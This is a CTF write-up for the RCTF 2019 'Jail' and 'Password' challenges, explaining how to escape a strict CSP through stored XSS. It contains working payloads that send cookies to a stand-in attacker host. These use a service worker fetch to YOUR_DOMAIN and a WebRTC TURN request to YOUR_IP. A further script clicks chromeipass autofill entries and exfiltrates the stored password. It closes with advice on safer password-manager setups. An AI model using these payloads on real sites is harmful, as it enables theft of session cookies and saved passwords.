# Jail & Password

## Jail

The star knows...

### Writeup

We should find all vulnerabilities first.

- Vul 1: ``?action=profile``, allowed us uploading arbitrary extensions to the server, so sad we can't upload ``.php``. But it may be useful.
- Vul 2:  ``?action=post`` , no filter for user input so there have a Stored XSS.

We know this is a XSS challenge so we should focus on ``?action=post``. This page has some extra limitations. Just like a prison which hard to escape from, flag is imprisoned and you can't take it out.

Limitation 1:  ``Content-Security-Policy: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';``.

This CSP limited the browser to get external resources, includes ``<img src>``, ``background: url()``, ``<script src>``,``<embed src>``, ``<iframe src>``, ``new XMLHttpRequest()``. And with the help of ``sandbox``,  ``<form action>`` requires ``allow-forms``, ``window.open`` and ``<a target="_blank">`` requires ``allow-popups``. So the only(?) way to get flag is redirection.

Limitation 2:

```html
<script>
window.addEventListener("beforeunload", function (event) {
  event.returnValue = "Are you sure want to exit?"
  return "Are you sure want to exit?"
})
Object.freeze(document.location) </script>
```

This script banned page redirection includes ``location.href`` and ``<meta>`` in real-world browsers. Thanks to standards, we can see how indestructible our defense is.

But we may forget something.

#### Way 1

The Service Worker is run under ``Execution Context`` so it may not follow the CSP from its registrant. [Service Workers 1, W3C Working Draft, 2 November 2017](https://www.w3.org/TR/service-workers-1/#content-security-policy) said:

> If serviceWorker’s script resource was delivered with a Content-Security-Policy HTTP header containing the value policy, the user agent must enforce policy for serviceWorker."

Therefore, we can reasonably know SW only follows CSP delivered with itself.

[Content Security Policy Level 3, W3C Working Draft, 15 October 2018](<https://www.w3.org/TR/CSP3/#fetch-integration>) said:

> If we get a response from a Service Worker (via [HTTP fetch](https://fetch.spec.whatwg.org/#concept-http-fetch), we’ll process its [CSP list](https://fetch.spec.whatwg.org/#concept-response-csp-list) before handing the response back to our caller.

That's mean "request" is not restricted. In my test,  ``fetch('/')`` will ignore ``connect-src: 'none'`` and the event ``fetch`` listened by SW will be triggered if a SW is registered. By the way, it's useless in this challenge so we just ignore it temporarily.

To register a Service Worker, we should check these conditions:

- Can we run JavaScript and register a SW? Yes, no limitation here.
- Is the page in "[Secure Context](<https://w3c.github.io/ServiceWorker/#secure-context>)"? Yes, https here.
- Can we upload a file which can return JavaScript MIME type? Yes, see vul 1, just upload a ``.js`` file.
- Can SW works? No, the scope should be ``scopeURL to the result of options.scope with the context object’s relevant settings object’s API base URL``. But don't care, our target is to send messages out, not let SW works.

So the final solution is to run JavaScript in an independent context by SW. First, let us create a ``.js``:

```javascript
fetch('https://YOUR_DOMAIN/?' + encodeURIComponent(globalThis.location.href), {mode: 'no-cors'})
```

Then, upload it and get URL:

```bash
curl 'https://jail.2019.rctf.rois.io/?action=profile' -X POST -H 'Cookie:PHPSESSID=iupr391ksbclg3l96s0sliv917' -F"avatar=@/Users/sx/website/sw-test/sw.js" -F"submit=submit"
```

Create a new message:

```html
<script> navigator.serviceWorker.register('/uploads/21ca75a36c5cdacfd4653fadb2553242.js?' + encodeURIComponent(document.cookie), {scope: '/uploads/'}); </script>
```

#### Way 2

WebRTC will ignore ``connect-src``, see: https://github.com/w3c/webrtc-pc/issues/1727. It seems they have no plan to fix this.

```html
<script></script>var pc = new RTCPeerConnection({"iceServers":[{"urls":["turn:YOUR_IP:YOUR_PORT?transport=udp"],"username":document.cookie,"credential":"."}]});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);</script>
```

#### Way 3

DNS prefetch: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control

### Flag

``RCTF{welc0me_t0_the_chaos_w0r1d}``

## Password

Successfully Jailbreak? Try to steal the password from the manager!

### Writeup

After ``jail``, you may know bot is not running under headless mode. That's because headless mode doesn't support extensions. We can add two ``<input>`` to the page, and read ``document.body.innerHTML``:

```html
<input type="username" name="username"><input type="password" name="password"> <script> setTimeout(() => {navigator.serviceWorker.register('/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?' + encodeURIComponent(document.body.innerHTML), {scope:'/uploads/'});}, 1000) </script>
```

Then we can get:

```html
<input type="username" name="username" data-cip-id="cIPJQ342845639" class="cip-ui-autocomplete-input" autocomplete="off"><span role="status" aria-live="polite" class="cip-ui-helper-hidden-accessible"></span><input type="password" name="password" data-cip-id="cIPJQ342845640"> <script> setTimeout(() => {navigator_serviceWorker_register('/uploads/511b3c8839bd36230c4aa3c5ff5545ef_js?' + encodeURIComponent(document_body_innerHTML), {scope:'/uploads/'});}, 1000) </script><div class="cip-genpw-icon cip-icon-key-small" style="z-index: 2; top: 10px; left: 341px;"></div><div class="cip-ui-dialog cip-ui-widget cip-ui-widget-content cip-ui-corner-all cip-ui-front cip-ui-draggable" tabindex="-1" role="dialog" aria-describedby="cip-genpw-dialog" aria-labelledby="cip-ui-id-1" style="display: none;"><div class="cip-ui-dialog-titlebar cip-ui-widget-header cip-ui-corner-all cip-ui-helper-clearfix"><span id="cip-ui-id-1" class="cip-ui-dialog-title">Password Generator</span><button class="cip-ui-button cip-ui-widget cip-ui-state-default cip-ui-corner-all cip-ui-button-icon-only cip-ui-dialog-titlebar-close" role="button" aria-disabled="false" title="×"><span class="cip-ui-button-icon-primary cip-ui-icon cip-ui-icon-closethick"></span><span class="cip-ui-button-text">×</span></button></div><div id="cip-genpw-dialog" class="cip-ui-dialog-content cip-ui-widget-content" style=""><div class="cip-genpw-clearfix"><button id="cip-genpw-btn-generate" class="b2c-btn b2c-btn-primary b2c-btn-small" style="float: left;">Generate</button><button id="cip-genpw-btn-clipboard" class="b2c-btn b2c-btn-small" style="float: right;">Copy to clipboard</button></div><div class="b2c-input-append cip-genpw-password-frame"><input id="cip-genpw-textfield-password" type="text" class="cip-genpw-textfield"><span class="b2c-add-on" id="cip-genpw-quality">123 Bits</span></div><label class="cip-genpw-label"><input id="cip-genpw-checkbox-next-field" type="checkbox" class="cip-genpw-checkbox"> also fill in the next password-field</label><button id="cip-genpw-btn-fillin" class="b2c-btn b2c-btn-small">Fill in &amp; copy to clipboard</button></div></div><ul class="cip-ui-autocomplete cip-ui-front cip-ui-menu cip-ui-widget cip-ui-widget-content cip-ui-corner-all" id="cip-ui-id-2" tabindex="0" style="display: none;"></ul>
```

You can Google "cip" and you will know its "chromeipass", it's a extension for Chrome to send and receive credentials from KeePass.

Just try to click the ``username`` input, as a normal user will do.

```html
<input type="username" name="username"><input type="password" name="password"> <script>setTimeout(()=>{ document.querySelector('[type=username]').click() },500); setTimeout(() => {navigator.serviceWorker.register('/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?' + encodeURIComponent(document.body.innerHTML), {scope:'/uploads/'});}, 1000) </script>
```

Then you will get a menu:

```html
<ul class="cip-ui-autocomplete cip-ui-front cip-ui-menu cip-ui-widget cip-ui-widget-content cip-ui-corner-all" id="cip-ui-id-2" tabindex="0" style="display: block; width: 233px; top: 29px; left: 8px; z-index: 2147483636;"><li class="cip-ui-menu-item" role="presentation"><a id="cip-ui-id-3" class="cip-ui-corner-all" tabindex="-1">fake_flag (http://jail_2019_rctf_rois_io/)</a></li><li class="cip-ui-menu-item" role="presentation"><a id="cip-ui-id-4" class="cip-ui-corner-all" tabindex="-1">flag (http://jail_2019_rctf_rois_io/)</a></li></ul>
```

Click on "flag", and read the password from ``password.value``, done.

### Solution

Create a ``.js`` as same as ``Jail``, and report this message.

```html
<input type="username" name="username">
<input type="password" name="password" id="password">
<script>
  setTimeout(()=>{document.querySelector('[type=username]').click()},500);
  setTimeout(()=>{document.getElementById('cip-ui-id-4').click()}, 1000);
  setTimeout(() => {navigator.serviceWorker.register('/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?' + encodeURIComponent(document.getElementById('password').value), {scope:'/uploads/'});}, 1500)
</script>
```

Flag: ``rctf{kpHttp_m4y_leak_ur_pwd}``

### Keep Safe

So sad, ``chromeipass`` it's not secure. Unconcerned one can steal your passwords with a simple XSS because DOMs injected by ``chromeipass`` are accessible for the page. ``1Password`` have no this problem because its password selection window is independent.

We know, ``chromeipass`` have multiple backends. ``KeePass C#`` with ``pfn/KeePassHttp`` is the most secure backend. It has "KeePassHttp Settings" for each item and allows users to add a website into whitelist or blacklist. When the website requests an item, it will show a notification default. To keep safe, just remove stored permissions from all entries and do not disable notification, and you will be prompted when autofill.

``KeeWeb`` + ``KeeWebHttp`` is insecure. It have no prompt or notifications.

``MacPass`` + ``MacPassHttp`` is very insecure. If you sure want to use it, at least upgrade ``MacPassHttp`` to the latest version. The inspiration for this challenge came from [a vulnerability I found and fixed in MacPassHttp](https://github.com/MacPass/MacPassHTTP/issues/54).

